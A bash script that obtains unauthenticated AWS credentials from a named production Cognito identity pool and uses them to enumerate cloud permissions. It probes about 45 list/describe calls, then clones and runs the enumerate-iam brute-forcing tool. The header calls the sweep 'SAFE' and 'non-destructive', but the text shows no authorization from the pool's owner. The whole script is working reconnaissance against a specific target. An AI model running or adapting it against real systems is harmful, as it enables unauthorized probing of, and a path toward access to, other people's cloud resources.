#!/usr/bin/env bash
# OPERATOR-RUN v2 — full non-destructive permission sweep for RelayMobile_Unauth_Users_prod_NA.
# Self-contained bash brute of list_/describe_ calls (names/schema/metadata ONLY — never values,
# items, records, or messages). Plus a raw enumerate-iam attempt with diagnostics. SAFE.
set -uo pipefail
POOL="us-east-1:56106a99-23f8-4333-8edd-612af3b9de11"; REGION="us-east-1"
IDID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region "$REGION" --no-sign-request --query IdentityId --output text)
CREDS=$(aws cognito-identity get-credentials-for-identity --identity-id "$IDID" --region "$REGION" --no-sign-request)
export AWS_ACCESS_KEY_ID="$(jq -r .Credentials.AccessKeyId <<<"$CREDS")"
export AWS_SECRET_ACCESS_KEY="$(jq -r .Credentials.SecretKey <<<"$CREDS")"
export AWS_SESSION_TOKEN="$(jq -r .Credentials.SessionToken <<<"$CREDS")"
export AWS_DEFAULT_REGION="$REGION"
echo "role: $(aws sts get-caller-identity --query Arn --output text 2>&1)"

echo "################ BROAD PERMISSION SWEEP (ALLOW = role can do it) ################"
probe(){ # label  aws-args...
  local label="$1"; shift
  local out; out=$(aws "$@" --region "$REGION" 2>&1)
  if grep -qiE 'AccessDenied|not authorized|UnauthorizedOperation|explicit deny|AuthorizationError' <<<"$out"; then
    return 0   # denied -> silent
  elif grep -qiE 'error occurred|InvalidClientTokenId|ExpiredToken|could not|Unable to locate' <<<"$out"; then
    printf '  ?? %-38s %s\n' "$label" "$(head -1 <<<"$out" | cut -c1-70)"
  else
    printf '  ✅ %-38s %s\n' "$label" "$(tr -d "\n" <<<"$out" | cut -c1-90)"
  fi
}
# names/schema/metadata only — nothing that returns values/items/records/message bodies
probe "s3:ListBuckets"              s3api list-buckets
probe "sqs:ListQueues"             sqs list-queues
probe "sns:ListTopics"             sns list-topics
probe "sns:ListSubscriptions"      sns list-subscriptions
probe "dynamodb:ListTables"        dynamodb list-tables
probe "lambda:ListFunctions"       lambda list-functions
probe "lambda:ListEventSourceMaps" lambda list-event-source-mappings
probe "apigateway:GetRestApis"     apigateway get-rest-apis
probe "cognito-identity:ListPools" cognito-identity list-identity-pools --max-results 5
probe "cognito-idp:ListUserPools"  cognito-idp list-user-pools --max-results 5
probe "cognito-sync:ListDatasets"  cognito-sync list-datasets --identity-pool-id "$POOL" --identity-id "$IDID"
probe "iam:ListRoles"              iam list-roles
probe "iam:GetAccountSummary"      iam get-account-summary
probe "ec2:DescribeInstances"      ec2 describe-instances --max-results 5
probe "ec2:DescribeSecurityGroups" ec2 describe-security-groups --max-results 5
probe "secretsmanager:ListSecrets" secretsmanager list-secrets --max-results 5
probe "ssm:DescribeParameters"     ssm describe-parameters --max-results 5
probe "kinesis:ListStreams"        kinesis list-streams
probe "firehose:ListDeliveryStr"   firehose list-delivery-streams
probe "iot:ListThings"             iot list-things --max-results 5
probe "iot:DescribeEndpoint"       iot describe-endpoint
probe "iot:ListTopicRules"         iot list-topic-rules
probe "cloudwatch:DescribeAlarms"  cloudwatch describe-alarms --max-records 5
probe "logs:DescribeLogGroups"     logs describe-log-groups --limit 5
probe "states:ListStateMachines"   stepfunctions list-state-machines --max-results 5
probe "appsync:ListGraphqlApis"    appsync list-graphql-apis --max-results 5
probe "rds:DescribeDBInstances"    rds describe-db-instances
probe "es:ListDomainNames"         es list-domain-names
probe "kms:ListKeys"               kms list-keys --limit 5
probe "ecr:DescribeRepositories"   ecr describe-repositories --max-results 5
probe "ecs:ListClusters"           ecs list-clusters
probe "eks:ListClusters"           eks list-clusters
probe "cloudfront:ListDistros"     cloudfront list-distributions
probe "route53:ListHostedZones"    route53 list-hosted-zones
probe "pinpoint:GetApps"           pinpoint get-apps
probe "mobiletargeting"            pinpoint get-apps
probe "location:ListMaps"          location list-maps --max-results 5
probe "location:ListTrackers"      location list-trackers --max-results 5
probe "location:ListGeofenceColl"  location list-geofence-collections --max-results 5
probe "glue:GetDatabases"          glue get-databases
probe "athena:ListWorkGroups"      athena list-work-groups
probe "events:ListRules"           events list-rules --limit 5
probe "cloudformation:ListStacks"  cloudformation list-stacks
probe "sts:GetSessionToken"        sts get-session-token

echo "################ enumerate-iam (raw, with diagnostics) ################"
echo "git: $(command -v git || echo MISSING) | dir: $([ -f "$HOME/tools/enumerate-iam/enumerate-iam.py" ] && echo present || echo absent)"
if [ ! -f "$HOME/tools/enumerate-iam/enumerate-iam.py" ]; then
  mkdir -p "$HOME/tools"; git clone https://github.com/andresriancho/enumerate-iam "$HOME/tools/enumerate-iam" 2>&1 | tail -2
  pip3 install -r "$HOME/tools/enumerate-iam/requirements.txt" 2>&1 | tail -2
fi
if [ -f "$HOME/tools/enumerate-iam/enumerate-iam.py" ]; then
  ( cd "$HOME/tools/enumerate-iam" && python3 enumerate-iam.py \
      --access-key "$AWS_ACCESS_KEY_ID" --secret-key "$AWS_SECRET_ACCESS_KEY" --session-token "$AWS_SESSION_TOKEN" 2>&1 ) \
    | grep -aiE 'supported|allow|-- |root|error|token' | head -60
fi
echo "################ DONE ################"
